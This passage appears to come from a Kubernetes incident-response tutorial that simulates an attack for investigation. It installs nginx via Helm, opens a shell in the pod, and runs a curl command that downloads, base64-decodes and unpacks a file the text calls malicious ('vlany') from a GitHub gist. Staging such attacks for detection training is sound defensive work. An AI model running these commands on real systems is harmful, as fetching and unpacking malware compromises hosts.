We will go now go through a incident response workflow and how you can investigate an event.

Let's use Helm to install a nginx container:

`helm repo add bitnami https://charts.bitnami.com
helm install --name example bitnami/nginx`

You can check that the container is running, and its name by running  
`kubectl get po -l app=example-nginx`

Now let's play the attacker, and spawn a shell:  
`kubectl exec -it YOUR_POD_NAME -c example-nginx -- /bin/bash`

You can execute a few commands inside the container, or even download some malicious file.  
`cd /tmp &&
curl https://gist.githubusercontent.com/mateobur/d888e36de12f8fe42a18f54ce4b1fc7c/raw/dd0c4cb23db7cc17a2086c5dee9338522fb8ae69/vlany | base64 -d > vlany-master.tar.gz &&
tar zxvf vlany-master.tar.gz`
